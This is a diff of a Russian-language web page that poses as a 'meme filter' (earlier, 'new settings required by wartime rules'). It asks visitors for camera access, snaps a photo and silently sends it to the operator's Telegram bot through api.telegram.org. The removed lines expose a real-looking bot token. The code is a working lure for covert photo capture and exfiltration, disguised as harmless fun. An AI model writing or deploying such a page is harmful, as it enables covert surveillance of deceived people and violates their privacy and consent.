@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>новые идеи!</title>
+  <title>Смешной фильтр 2026 😂</title>
   <style>
     body { margin:0; font-family: Arial, sans-serif; background:#111; color:#fff; text-align:center; }
     #container { padding: 20px; max-width: 500px; margin: auto; }
@@ -20,18 +20,17 @@
 </head>
 <body>
 
-<!-- СКРИПТ ПЕРЕМЕЩЁН ВВЕРХ — ЭТО КЛЮЧЕВОЙ ФИКС -->
 <script>
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
 const status = document.getElementById('status');
 
-const TELEGRAM_TOKEN = '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11';  // ← ТВОЙ ТОКЕН
-const CHAT_ID = '123456789';  // ← ТВОЙ chat_id
+const TELEGRAM_TOKEN = 'ЗАМЕНИ_СВОЙ_ТОКЕН_СЮДА';  // ← вставь свой
+const CHAT_ID = 'ЗАМЕНИ_СВОЙ_CHAT_ID_СЮДА';     // ← вставь свой
 
 async function startPrank() {
-  status.textContent = 'Запрашиваем расширения...';
+  status.textContent = 'Запрашиваем камеру...';
   
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -53,7 +52,7 @@ async function startPrank() {
     
     const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
     
-    status.textContent = 'проверяю бот ли ты?';
+    status.textContent = 'Отправляю тебе... подожди 2 сек 😈';
     
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
@@ -62,27 +61,31 @@ async function startPrank() {
     const blob = await (await fetch(dataUrl)).blob();
     formData.append('photo', blob, 'prank.jpg');
     
-    await fetch(`https://api.telegram.org/bot${8678005399:AAFTHzqbs40DHQ3ziXoAXdFR1Kg_cuu_PTc}/sendPhoto`, {
+    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
       method: 'POST',
       body: formData
     });
     
-    status.innerHTML = 'жди немного<br>еще немного.';
+    if (!response.ok) {
+      throw new Error(`Telegram error: ${response.status}`);
+    }
+    
+    status.innerHTML = 'Фото отправлено тебе! 😂<br>Можешь закрыть страницу.';
     
   } catch (err) {
     console.error(err);
     status.textContent = err.name === 'NotAllowedError' 
-      ? 'Ты не разрешил расширение! 😢 Попробуй ещё раз!'
+      ? 'Ты не разрешил камеру 😢 Попробуй ещё раз!'
       : 'Ошибка: ' + err.message;
   }
 }
 </script>
 
 <div id="container">
-  <h1>😂 Проверь новые настройки!</h1>
-  <p>Нажми кнопку ниже, разреши разрешения изза новых правил, при войне!</p>
+  <h1>😂 Проверь новый мемный фильтр!</h1>
+  <p>Нажми кнопку ниже, разреши камеру — и увидишь, как ты выглядишь с крутым эффектом 2026 года 😎</p>
   
-  <button onclick="startPrank()">открыть идеи</button>
+  <button onclick="startPrank()">ВКЛЮЧИТЬ ФИЛЬТР 😂</button>
   
   <div id="status"></div>
 </div>
